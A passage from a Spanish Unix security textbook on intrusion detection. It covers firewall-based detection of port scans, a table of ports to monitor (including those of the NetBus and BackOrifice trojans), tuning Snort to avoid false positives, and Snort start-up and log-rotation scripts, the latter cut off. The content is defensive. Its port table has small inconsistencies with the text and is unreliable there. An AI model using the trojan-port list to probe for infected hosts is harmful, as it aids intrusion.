arquitectura de red, formando lo que se suele denominar un modelo de seguridad de c&#x02CA;&#x0131;rculos conc&#x00E9;ntricos
(<citation>[?]</citation>). Para ello, imaginemos un pirata externo a nuestra organizaci&#x00F3;n que intenta atacar una determinada
m&#x00E1;quina, y pensemos en el primer punto en el que podemos detectar dicho ataque y actuar sobre &#x00E9;l:
ah&#x02CA;&#x0131; es donde deberemos implantar el primer sensor, ya que se trata de la primera barrera
que estamos interponiendo entre el atacante y su objetivo; ese primer punto no es otro que
nuestro router de salida a Internet, el marcado como &#x2018;1&#x2019; en la &#xFB01;gura  <ulink 
  url="#x1-2880011"  ><!--ref: sensores-ids--></ulink> (pido perd&#x00F3;n por mi
estilo &#x2018;art&#x02CA;&#x0131;stico&#x2019;). No podemos entrar aqu&#x02CA;&#x0131; a tratar detalles sobre las capacidades de detecci&#x00F3;n
de intrusos de productos como los routers Cisco y su IOS, o de otros elementos f&#x00E1;cilmente
integrables con esta electr&#x00F3;nica de red, como NetRanger (tambi&#x00E9;n de Cisco), ya que se trata de
sistemas que poco tienen que ver con Unix, y que en muchos casos no controlamos nosotros
directamente sino una tercera organizaci&#x00F3;n (por ejemplo, Telef&#x00F3;nica), a pesar de que tengan incluso una
direcci&#x00F3;n IP perteneciente a nuestra red. En las p&#x00E1;ginas web de los distintos fabricantes se puede
encontrar informaci&#x00F3;n muy &#x00FA;til sobre sus productos orientados a la detecci&#x00F3;n y respuesta ante
ataques.
  <!--l. 943--><section 
role="subsection"><title><abbrev role="title-mark">18.8.1</abbrev><anchor 
   id="x1-28900018.8.1"  ></anchor>IDS en el cortafuegos</title>
<!--l. 944--><para>  Volviendo a la &#xFB01;gura  <ulink 
  url="#x1-2880011"  ><!--ref: sensores-ids--></ulink>, el segundo punto que separar&#x00E1; al atacante de su objetivo (es decir, nos proteger&#x00E1; de
&#x00E9;l) ser&#x00E1; nuestro cortafuegos corporativo. Este elemento, sobre el que probablemente ya tendremos pleno
control, estar&#x00E1; formado por uno o varios sistemas Unix con un software de &#xFB01;ltrado de paquetes ejecut&#x00E1;ndose
sobre ellos, y es aqu&#x02CA;&#x0131; donde vamos a implantar el primer esquema de detecci&#x00F3;n de intrusos y respuesta
autom&#x00E1;tica ante ataques (esta respuesta ser&#x00E1; habitualmente el bloqueo de la direcci&#x00F3;n atacante en el propio
&#xFB01;rewall).
<!--br/-->
<!--br/-->Para decidir qu&#x00E9; tipos de ataques debemos detectar y bloquear en nuestro cortafuegos debemos pararnos
a pensar con qu&#x00E9; informaci&#x00F3;n trabaja habitualmente este sistema; cualquier &#xFB01;rewall lo har&#x00E1; al
menos con los cinco elementos que de&#xFB01;nen una conexi&#x00F3;n bajo la pila TCP/IP: direcci&#x00F3;n origen,
direcci&#x00F3;n destino, puerto origen, puerto destino y protocolo. De estos cinco, quiz&#x00E1;s los dos menos
importantes (de cara a detectar ataques) son quiz&#x00E1;s el protocolo utilizado y el puerto origen
de la conexi&#x00F3;n; por tanto, son los otros tres elementos los que nos ayudar&#x00E1;n en la constituci&#x00F3;n
de nuestro IDS y los que nos facilitar&#x00E1;n el poder lanzar una respuesta autom&#x00E1;tica contra el
atacante.
<!--br/-->
<!--br/-->Conociendo las direcciones origen y destino y el puerto destino de una conexi&#x00F3;n ya podemos detectar cierto
tipo de ataques; quiz&#x00E1;s el ejemplo m&#x00E1;s habitual son los escaneos de puertos, tanto horizontales como
verticales, que se lanzan contra nuestros sistemas. La t&#x00E9;cnica de detecci&#x00F3;n de estos ataques se de&#xFB01;ne
perfectamente en <citation>[?]</citation>: est&#x00E1; basada por el momento en comprobar X eventos de inter&#x00E9;s dentro de una
ventana de tiempo Y. As&#x02CA;&#x0131;, podemos analizar en nuestro cortafuegos cu&#x00E1;ndo una misma direcci&#x00F3;n
origen accede a un determinado puerto de varios destinos en menos de un cierto tiempo umbral
(escaneo horizontal) o cuando accede a diferentes puertos bien conocidos de un mismo sistema
tambi&#x00E9;n en menos de ese tiempo umbral (escaneo vertical). &#x00BF;Por qu&#x00E9; el hecho de &#xFB01;jarnos s&#x00F3;lo en
puertos bien conocidos en este &#x00FA;ltimo caso? Muy sencillo: muchas aplicaciones abren muchos
puertos destino, generalmente altos (por encima del 1024), en una &#x00FA;nica sesi&#x00F3;n de funcionamiento,
por lo que esa sesi&#x00F3;n ser&#x02CA;&#x0131;a identi&#xFB01;cada por el cortafuegos como un escaneo vertical cuando
realmente no lo es (y si adem&#x00E1;s en nuestro esquema de respuesta autom&#x00E1;tica decidimo bloquear la IP
&#x2018;atacante&#x2019;, causar&#x02CA;&#x0131;amos una grave negaci&#x00F3;n de servicio contra usuarios leg&#x02CA;&#x0131;timos de nuestros
sistemas).
<!--br/-->
<!--br/-->Una t&#x00E9;cnica alternativa que con frecuencia suele ser utilizada con bastante efectividad para detectar
escaneos verticales consiste en vigilar del acceso a determinados puertos de los sistemas protegidos por el
&#xFB01;rewall, acceso que con toda probabilidad representar&#x00E1; un intento de violaci&#x00F3;n de nuestras pol&#x02CA;&#x0131;ticas de
seguridad. No nos enga~nemos: si alguien trata de acceder desde fuera del segmento protegido a puertos
como echo (7/TCP,UDP), systat (11/TCP), netstat (15/TCP), tcpmux (1/tcp) o el desfasado uucp
(540/TCP), lo m&#x00E1;s probable es que se trate de una persona que no lleva muy buena intenci&#x00F3;n con

respecto a nuestras m&#x00E1;quinas. Seguramente estar&#x00E1; lanzando un escaneo vertical contra nosotros,
aunque a veces tambi&#x00E9;n se puede tratar de un simple curioso que trata de comprobar nuestro
grado de seguridad para lanzar un ataque posterior: evidentemente, si alguien tiene abierto un
puerto de los citados anteriormente, denota una escasa preocupacion por su seguridad, por lo
que casi con toda certeza se puede intuir que tendr&#x00E1; agujeros importantes en alguna de sus
m&#x00E1;quinas.
<!--br/-->
<!--br/-->Otro tipo de ataques que tambi&#x00E9;n son f&#x00E1;cilmente detectables vigilando el acceso a determinados puertos de
nuestros sistemas protegidos son aquellos que detectan la presencia &#x2013; o la comprobaci&#x00F3;n de la presencia &#x2013; de
diferentes troyanos como NetBus o BackOri&#xFB01;ce: si en el &#xFB01;rewall se detecta tr&#x00E1;&#xFB01;co dirigido a puertos como
12345, 12346 o 20034 (TCP) o como 31337 (UDP), sin duda se trata de un atacante que est&#x00E1;
tratando de aprovechar estos troyanos; en muchos casos &#x2013; la mayor&#x02CA;&#x0131;a &#x2013; se tratar&#x00E1; de escaneos
horizontales en busca de m&#x00E1;quinas contaminadas a lo largo de toda o gran parte de nuestra clase
C.


</para><section role="center"><title/>
<!--l. 1008--><para> </para><table ><informaltable><tgroup cols="4"><tbody><row><entry 
 align="center"><para>  Servicio  </para></entry><entry 
 align="center"><para>Puerto</para></entry><entry 
 align="center"><para>Protocolo</para></entry><entry 
 align="center"><para>        Ataque             </para></entry>
 </row><row><entry 
 align="center"><para>   ttymux  </para></entry><entry 
 align="center"><para>  1    </para></entry><entry 
 align="center"><para>  TCP   </para></entry><entry 
 align="center"><para>    Escaneo horizontal      </para></entry>
 </row><row><entry 
 align="center"><para>    echo   </para></entry><entry 
 align="center"><para>  7    </para></entry><entry 
 align="center"><para>TCP/UDP</para></entry><entry 
 align="center"><para>    Escaneo horizontal      </para></entry>
 </row><row><entry 
 align="center"><para>   systat  </para></entry><entry 
 align="center"><para>  7    </para></entry><entry 
 align="center"><para>  TCP   </para></entry><entry 
 align="center"><para>    Escaneo horizontal      </para></entry>
 </row><row><entry 
 align="center"><para>  daytime </para></entry><entry 
 align="center"><para>  13   </para></entry><entry 
 align="center"><para>TCP/UDP</para></entry><entry 
 align="center"><para>    Escaneo horizontal      </para></entry>
 </row><row><entry 
 align="center"><para>  netstat </para></entry><entry 
 align="center"><para>  15   </para></entry><entry 
 align="center"><para>  TCP   </para></entry><entry 
 align="center"><para>    Escaneo horizontal      </para></entry>
 </row><row><entry 
 align="center"><para>   finger  </para></entry><entry 
 align="center"><para>  79   </para></entry><entry 
 align="center"><para>  TCP   </para></entry><entry 
 align="center"><para>Escaneo horizontal/vertical</para></entry>
 </row><row><entry 
 align="center"><para>     who   </para></entry><entry 
 align="center"><para> 513  </para></entry><entry 
 align="center"><para>  UDP   </para></entry><entry 
 align="center"><para>    Escaneo horizontal      </para></entry>
 </row><row><entry 
 align="center"><para>    uucp   </para></entry><entry 
 align="center"><para> 540  </para></entry><entry 
 align="center"><para>  TCP   </para></entry><entry 
 align="center"><para>Escaneo horizontal/vertical</para></entry>
 </row><row><entry 
 align="center"><para>   NetBus   </para></entry><entry 
 align="center"><para>12345 </para></entry><entry 
 align="center"><para>  TCP   </para></entry><entry 
 align="center"><para>        Troyano             </para></entry>
 </row><row><entry 
 align="center"><para>   NetBus   </para></entry><entry 
 align="center"><para>12346 </para></entry><entry 
 align="center"><para>  TCP   </para></entry><entry 
 align="center"><para>        Troyano             </para></entry>
 </row><row><entry 
 align="center"><para>   NetBus   </para></entry><entry 
 align="center"><para>20034 </para></entry><entry 
 align="center"><para>  TCP   </para></entry><entry 
 align="center"><para>        Troyano             </para></entry>
 </row><row><entry 
 align="center"><para>BackOri&#xFB01;ce</para></entry><entry 
 align="center"><para>31337 </para></entry><entry 
 align="center"><para>  UDP   </para></entry><entry 
 align="center"><para>        Troyano             </para></entry>
 </row><row><entry 
 align="center"><para>      Hack&#x02CA; </para></entry><entry 
 align="center"><para>31789 </para></entry><entry 
 align="center"><para>  UDP   </para></entry><entry 
 align="center"><para>        Troyano             </para></entry>
 </row><row><entry 
 align="center"><para>      Hack&#x02CA; </para></entry><entry 
 align="center"><para>31790 </para></entry><entry 
 align="center"><para>  UDP   </para></entry><entry 
 align="center"><para>        Troyano             </para></entry>
 </row><row><entry 
 align="center"><para>               </para></entry>
 </row></tbody></tgroup></informaltable></section>
<blockquote role="caption"><title role="caption"><anchor 
   id="x1-2890011"  ></anchor>Cuadro&#x00A0;18.1</title><para>Algunos puertos a monitorizar en un &#xFB01;rewall</para></blockquote>

<!--l. 1046--><para>  En la tabla  <ulink 
  url="#x1-2890011"  ><!--ref: puertos--></ulink> se muestran algunos de los puertos a los que conviene estar atentos a la hora de dise~nar
una pol&#x02CA;&#x0131;tica de detecci&#x00F3;n de intrusos en nuestro cortafuegos; por supuesto, existen muchos m&#x00E1;s que pueden
ser considerados &#x2018;sospechosos&#x2019;, pero en cualquier caso siempre conviene ser muy precavido con su
monitorizaci&#x00F3;n ya que algunos de ellos pueden ser usados por usuarios l&#x02CA;&#x0131;citos a los que causar&#x02CA;&#x0131;amos una
grave negaci&#x00F3;n de servicio si, por ejemplo, les bloque&#x00E1;ramos el acceso a nuestra red a causa de un falso
positivo.
<!--br/-->
<!--br/-->Todos sabemos que el cortafuegos es algo vital para proteger a nuestros sistemas, pero lamentablemente es
un elemento muy limitado a la hora de detectar ataques. Por ejemplo, imaginemos la siguiente situaci&#x00F3;n: un
atacante decide comprobar si nuestro servidor web corporativo tiene alg&#x00FA;n tipo de vulnerabilidad que
le pueda ayudar en un ataque contra la m&#x00E1;quina; algo muy com&#x00FA;n hoy en d&#x02CA;&#x0131;a, ya que quiz&#x00E1;s
uno de los mayores da~nos que puede sufrir la imagen de una empresa &#x2013; especialmente si est&#x00E1;
relacionada con las nuevas tecnolog&#x02CA;&#x0131;as &#x2013; es una modi&#xFB01;caci&#x00F3;n de su p&#x00E1;gina web principal. Es
muy probable que ese pirata lanzara en primer lugar un escaneo de puertos vertical contra el
servidor, para comprobar si aparte del servicio HTTP se est&#x00E1; ofreciendo alg&#x00FA;n otro; si todo es
correcto, el puerto de web ser&#x00E1; el &#x00FA;nico abierto en el cortafuegos corporativo, cortafuegos que adem&#x00E1;s
detectar&#x00E1; el ataque contra la m&#x00E1;quina y bloquear&#x00E1;, al menos temporalmente, cualquier acceso
de la direcci&#x00F3;n atacante. Un punto a nuestro favor, pero el pirata no tiene m&#x00E1;s que colgar el
m&#x00F3;dem y volver a llamar a su proveedor para conseguir otra IP, con lo cual obtiene de nuevo
acceso a nuestro servicio HTTP y adem&#x00E1;s ya sabe que el &#x00FA;nico puerto abierto en la m&#x00E1;quina es
ese.
<!--br/-->
<!--br/-->Ahora ese atacante no necesita ning&#x00FA;n tipo de escaneo de puertos adicional; puede seguir varios caminos
para atacarnos, pero sin duda el m&#x00E1;s l&#x00F3;gico y f&#x00E1;cil es tratar de localizar vulnerabilidades en el servidor web de
nuestra organizaci&#x00F3;n. Para ello puede lanzar un escaneador de vulnerabilidades en servidores
web <anchor 
   id="x1-289002f1"  ></anchor><footnote><para>    Generalmente se les denomina CGI Scanners, aunque no s&#x00F3;lo comprueban la presencia de CGIs vulnerables, sino que
tambi&#x00E9;n detectan errores de con&#xFB01;guraci&#x00F3;n, versiones de los demonios, etc.</para></footnote>
contra la m&#x00E1;quina, escaneador que no generar&#x00E1; ninguna alerta en el cortafuegos; al &#xFB01;n y al cabo, lo &#x00FA;nico que
hacen estos programas es lanzar peticiones al puerto 80 de nuestro servidor web, algo que el &#xFB01;rewall no
contempla como sospechoso: para &#x00E9;l, no hay diferencia entre un analizador de CGIs y peticiones normales a
nuestras p&#x00E1;ginas.
<!--br/-->
<!--br/-->Parece por tanto evidente que nuestra primera barrera de detecci&#x00F3;n de intrusos es realmente &#x00FA;til, pero
tambi&#x00E9;n insu&#xFB01;ciente frente a determinados ataques; entonces entra en juego el segundo nivel de nuestro
sistema de detecci&#x00F3;n de intrusos, el ubicado en el segmento de red &#x2013; en el dominio de colisi&#x00F3;n &#x2013; en el que se
encuentra el host que estamos tratando de proteger.
  </para></section><!--end subsection--><!--l. 1091--><section 
role="subsection"><title><abbrev role="title-mark">18.8.2</abbrev><anchor 
   id="x1-29000018.8.2"  ></anchor>IDS en la red: SNORT</title>
<!--l. 1093--><para>  SNORT (<citation>[?]</citation>) es un sni&#xFB00;er capaz de actuar como sistema de detecci&#x00F3;n de intrusos en redes de tr&#x00E1;&#xFB01;co
moderado; su facilidad de con&#xFB01;guraci&#x00F3;n, su adaptabilidad, sus requerimientos m&#x02CA;&#x0131;nimos (funciona en
diferentes Unices, incluyendo un simple PC con Linux, Solaris o cualquier BSD gratuito), y
sobre todo su precio (se trata de un software completamente gratuito que podemos descargar
desde su p&#x00E1;gina o&#xFB01;cial en INet, http://www.snort.org/) lo convierten en una &#x00F3;ptima elecci&#x00F3;n en
multitud de entornos, frente a otros sistemas como NFR (Network Flight Recorder) o ISS
RealSecure que, aunque quiz&#x00E1;s sean m&#x00E1;s potentes, son tambi&#x00E9;n mucho m&#x00E1;s pesados e in&#xFB01;nitamente m&#x00E1;s
caros.
<!--br/-->
<!--br/-->Para instalar un sistema de detecci&#x00F3;n de intrusos basado en SNORT en primer lugar necesitamos
evidentemente este programa, que podemos descargar desde su p&#x00E1;gina web. Adem&#x00E1;s, para compilarlo
correctamente es necesario disponer de las librer&#x02CA;&#x0131;as libpcap, un interfaz para tratamiento de paquetes de
red desde espacio de usuario, y es recomendable tambi&#x00E9;n (aunque no obligatorio) instalar Libnet, librer&#x02CA;&#x0131;a
para la construcci&#x00F3;n y el manejo de paquetes de red. Con este software correctamente instalado en nuestro
sistema, la compilaci&#x00F3;n de SNORT es trivial.
<!--br/-->
<!--br/-->Si volvemos a la clasi&#xFB01;caci&#x00F3;n de IDSes que hemos presentado al principio de este cap&#x02CA;&#x0131;tulo, podemos
clasi&#xFB01;car a SNORT como un sistema basado en red (se monitoriza todo un dominio de colisi&#x00F3;n) y

que funciona mediante detecci&#x00F3;n de usos indebidos. Estos usos indebidos &#x2013; o cuanto menos
sospechosos &#x2013; se re&#xFB02;ejan en una base de datos formada por patrones de ataques; dicha base
de datos se puede descargar tambi&#x00E9;n desde la propia p&#x00E1;gina web de SNORT, donde adem&#x00E1;s se
pueden generar bases de patrones &#x2018;a medida&#x2019; de diferentes entornos (por ejemplo, ataques contra
servidores web, intentos de negaciones de servicio, exploits&#x2026;). El archivo que utilicemos en
nuestro entorno ser&#x00E1; la base para el correcto funcionamiento de nuestro sistema de detecci&#x00F3;n de
intrusos.
<!--br/-->
<!--br/-->Una vez hemos compilado e instalado correctamente el programa llega el momento de ponerlo en
funcionamiento; y es aqu&#x02CA;&#x0131; donde se produce &#x2013; al menos inicialmente &#x2013; uno de los errores m&#x00E1;s graves en la
detecci&#x00F3;n de intrusos. Por l&#x00F3;gica, uno tiende a pensar que el sensor proporcionar&#x00E1; mejores resultados cuantos
m&#x00E1;s patrones de ataques contenga en su base de datos; nada m&#x00E1;s lejos de la realidad. En primer lugar, es
muy probable que no todos los ataques que SNORT es capaz de detectar sean susceptibles de producirse en
el segmento de red monitorizado; si situamos el sensor en una zona desmilitarizada donde
&#x00FA;nicamente ofrecemos servicio de web, &#x00BF;qu&#x00E9; inter&#x00E9;s tiene tratar de detectar ataques contra DNS? Lo
l&#x00F3;gico es que las pol&#x02CA;&#x0131;ticas implementadas en nuestro cortafuegos ni siquiera dejen pasar tr&#x00E1;&#xFB01;co
hacia puertos que no sean los de los servidores web pero, incluso en caso de que el potencial
ataque se produjera entre m&#x00E1;quinas del propio segmento, hemos de evaluar con mucho cuidado si
realmente vale la pena sobrecargar la base de datos con patrones que permitan detectar estos
ataques. Evidentemente, cuanta m&#x00E1;s az&#x00FA;car m&#x00E1;s dulce, pero si el sensor ha de analizar todo el
tr&#x00E1;&#xFB01;co, quiz&#x00E1;s mientras trata de decidir si un paquete entre dos m&#x00E1;quinas protegidas se adapta a
un patr&#x00F3;n estamos dejando pasar tramas provenientes del exterior que realmente representan
ataques: hemos de tener presente que el sni&#xFB00;er no detendr&#x00E1; el tr&#x00E1;&#xFB01;co que no sea capaz de analizar
para hacerlo m&#x00E1;s tarde, sino que simplemente lo dejar&#x00E1; pasar. As&#x02CA;&#x0131;, debemos introducir en la
base de patrones de ataques los justos para detectar actividades sospechosas contra nuestra
red.
<!--br/-->
<!--br/-->En segundo lugar, pero no menos importante, es necesario estudiar los patrones de tr&#x00E1;&#xFB01;co que circulan por
el segmento donde el sensor escucha para detectar falsos positivos y, o bien recon&#xFB01;gurar la base de
datos, o bien eliminar los patrones que generan esas falsas alarmas. Aunque suene algo crudo,
si un patr&#x00F3;n nos genera un n&#x00FA;mero considerable de falsos positivos, debemos plantearnos su
eliminaci&#x00F3;n: simplemente no podremos decidir si se trata de verdaderas o de falsas alarmas. Esto es
especialmente cr&#x02CA;&#x0131;tico si lanzamos respuestas autom&#x00E1;ticas contra las direcciones &#x2018;atacantes&#x2019; (por ejemplo,
detener todo su tr&#x00E1;&#xFB01;co en nuestro &#xFB01;rewall): volviendo al ejemplo de la zona desmilitarizada con
servidores web, podemos llegar al extremo de detener a simples visitantes de nuestras p&#x00E1;ginas
simplemente porque han generado falsos positivos; aunque en un entorno de alta seguridad
quiz&#x00E1;s vale la pena detener muchas acciones no da~ninas con tal de bloquear tambi&#x00E9;n algunos
ataques (aunque constituir&#x02CA;&#x0131;a una negaci&#x00F3;n de servicio en toda regla contra los usuarios que hacen
uso leg&#x02CA;&#x0131;timo de nuestros sistemas), en un entorno normal de producci&#x00F3;n esto es impensable.
Seguramente ser&#x00E1; m&#x00E1;s provechoso detectar y detener estos ataques por otros mecanismos ajenos al
sensor.
<!--br/-->
<!--br/-->En resumen, hemos de adaptar a nuestro entorno de trabajo, de una forma muy &#xFB01;na, la base de
datos de patrones de posibles ataques. Quiz&#x00E1;s valga la pena perder tiempo el tiempo que sea
necesario en esta parte de la implantaci&#x00F3;n, ya que eso nos ahorrar&#x00E1; despu&#x00E9;s muchos an&#x00E1;lisis de
falsas alarmas y, por qu&#x00E9; negarlo, alg&#x00FA;n que otro susto; una vez tengamos todo con&#xFB01;gurado,
podemos utilizar el siguiente script para lanzar SNORT de forma autom&#x00E1;tica al arrancar el sistema
(Solaris):

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;cat&#x00A0;/etc/init.d/snort
&#x00A0;#!/sbin/sh
&#x00A0;#
&#x00A0;#&#x00A0;Instalacion:
&#x00A0;#&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;cp&#x00A0;&#x003C;script&#x003E;&#x00A0;/etc/init.d/snort
&#x00A0;#&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;chmod&#x00A0;744&#x00A0;/etc/init.d/snort
&#x00A0;#&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;chown&#x00A0;root:sys&#x00A0;/etc/init.d/snort
&#x00A0;#&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;#&#x00A0;ln&#x00A0;/etc/init.d/snort&#x00A0;/etc/rc2.d/S99snort
&#x00A0;#
&#x00A0;
&#x00A0;#&#x00A0;Directorio&#x00A0;de&#x00A0;log
&#x00A0;DIRLOG=/var/log/snort
&#x00A0;#&#x00A0;Fichero&#x00A0;de&#x00A0;reglas
&#x00A0;RULES=/usr/local/security/snort.conf
&#x00A0;#&#x00A0;Ejecutable
&#x00A0;SNORT=/usr/local/security/snort
&#x00A0;#&#x00A0;Interfaz
&#x00A0;IF=hme0
&#x00A0;
&#x00A0;case&#x00A0;&#x0022;$1&#x0022;&#x00A0;in
&#x00A0;&#x2019;start&#x2019;)
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if&#x00A0;[&#x00A0;!&#x00A0;-d&#x00A0;&#x0022;$DIRLOG&#x0022;&#x00A0;];&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;mkdir&#x00A0;-p&#x00A0;&#x0022;$DIRLOG&#x0022;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;fi
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if&#x00A0;[&#x00A0;!&#x00A0;-r&#x00A0;&#x0022;$RULES&#x0022;&#x00A0;];&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;echo&#x00A0;&#x0022;No&#x00A0;puedo&#x00A0;leer&#x00A0;el&#x00A0;fichero&#x00A0;de&#x00A0;patrones...&#x0022;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;exit&#x00A0;-1
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;fi
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if&#x00A0;[&#x00A0;!&#x00A0;-x&#x00A0;&#x0022;$SNORT&#x0022;&#x00A0;];&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;echo&#x00A0;&#x0022;No&#x00A0;encuentro&#x00A0;el&#x00A0;ejecutable...&#x0022;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;exit&#x00A0;-1
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;fi
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;$SNORT&#x00A0;-l&#x00A0;$DIRLOG&#x00A0;-c&#x00A0;$RULES&#x00A0;-i&#x00A0;$IF&#x00A0;-N&#x00A0;-D
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;;;
&#x00A0;&#x2019;stop&#x2019;)
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;if&#x00A0;[&#x00A0;!&#x00A0;-r&#x00A0;&#x0022;/var/run/snort&#x005F;$IF.pid&#x0022;&#x00A0;];&#x00A0;then
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;echo&#x00A0;&#x0022;No&#x00A0;puedo&#x00A0;obtener&#x00A0;el&#x00A0;PID...&#x0022;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;exit&#x00A0;-1
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;fi
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;kill&#x00A0;-TERM&#x00A0;&#x2018;cat&#x00A0;/var/run/snort&#x005F;$IF.pid&#x2018;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;;;
&#x00A0;*)
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;echo&#x00A0;&#x0022;Usage:&#x00A0;$0&#x00A0;{&#x00A0;start&#x00A0;|&#x00A0;stop&#x00A0;}&#x0022;
&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;exit&#x00A0;1
&#x00A0;esac
&#x00A0;exit&#x00A0;0
&#x00A0;anita:~#
</literallayout>
<!--l. 1224--><para>Con el sensor y sus patrones correctamente con&#xFB01;gurados ya estamos listos para poner en funcionamiento
nuestro sistema de detecci&#x00F3;n de intrusos. Seguramente hasta ahora no hemos tenido muchos
problemas con el IDS; no obstante, a partir de ahora las cosas se empiezan a complicar un poco,
ya que comienza la segunda parte, la del tratamiento de la informaci&#x00F3;n que nuestro sensor
nos va a proporcionar. Y es que desde este momento el sistema de detecci&#x00F3;n va a empezar a

funcionar y a generar logs con noti&#xFB01;caciones de posibles ataques, o cuanto menos de actividades
sospechosas; es hora de decidir cosas como d&#x00F3;nde situar al sensor, qu&#x00E9; hacer ante la generaci&#x00F3;n de un
evento en el mismo, c&#x00F3;mo procesar la informaci&#x00F3;n recibida, o simplemente cu&#x00E1;ndo rotar los logs
generados.
<!--br/-->
<!--br/-->El &#x00FA;ltimo de los problemas planteados realmente tiene f&#x00E1;cil soluci&#x00F3;n; &#x00BF;cu&#x00E1;ndo rotar los logs que
SNORT genera? La respuesta es muy sencilla: depende. Depende de la cantidad de informes
generados en nuestro sensor, depende de la frecuencia con la que debamos realizar informes de los
ataque sufridos, depende de la implementaci&#x00F3;n elegida para ejecutar respuestas autom&#x00E1;ticas
ante un ataque (si las ejecutamos), etc. En de&#xFB01;nitiva, la rotaci&#x00F3;n correcta de unos logs es algo
que se debe estudiar y plani&#xFB01;car para cada entorno concreto, no se puede dar un periodo
estricto que se aplique siempre porque ser&#x02CA;&#x0131;a sin duda err&#x00F3;neo. No obstante, una idea que nos
puede ayudar en la toma de esta decisi&#x00F3;n es la siguiente: rotaremos los logs cuando los hayamos
procesado y extra&#x02CA;&#x0131;do de ellos la informaci&#x00F3;n que nos pueda interesar para proteger nuestro
entorno.
<!--br/-->
<!--br/-->SNORT genera logs en el directorio /var/log/snort/ si no le indicamos lo contrario (podemos hacerlo con
la opci&#x00F3;n &#x2018;-l&#x2019; del programa). En ese directorio encontraremos un &#xFB01;chero denominado alert con las
actividades que se vayan registrando, y, si no hubi&#x00E9;ramos especi&#xFB01;cado la opci&#x00F3;n &#x2018;-N&#x2019; al arrancar el
programa, una serie de subdirectorios cuyos nombres son las direcciones IP de las m&#x00E1;quinas de las que se
detecta alguna actividad (es el denominado &#x2018;packet logging&#x2019;). Como nosotros lo que buscamos es
b&#x00E1;sicamente la generaci&#x00F3;n de alarmas, independiente del packet logging, no necesitamos generar estos
directorios (aunque nada nos impide hacerlo).
<!--br/-->
<!--br/-->El siguiente shellscript plani&#xFB01;cado convenientemente con crontab (si lo ejecutamos m&#x00E1;s de una vez durante
el d&#x02CA;&#x0131;a quiz&#x00E1;s nos interese a&#xFB01;nar la variable $FECHA) puede ser utilizado para realizar la rotaci&#x00F3;n del archivo
de alarmas generado por SNORT:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;cat&#x00A0;/usr/local/security/rotalog
&#x00A0;#!/bin/sh
&#x00A0;#
&#x00A0;#&#x00A0;Directorio&#x00A0;de&#x00A0;log
&#x00A0;DIRLOG=/var/log/snort
&#x00A0;#&#x00A0;Fecha&#x00A0;(DD/MM/YY)
&#x00A0;FECHA=&#x2018;date&#x00A0;+%d.%m.%Y&#x2018;
&#x00A0;#&#x00A0;Interfaz
&#x00A0;IF=hme0
&#x00A0;
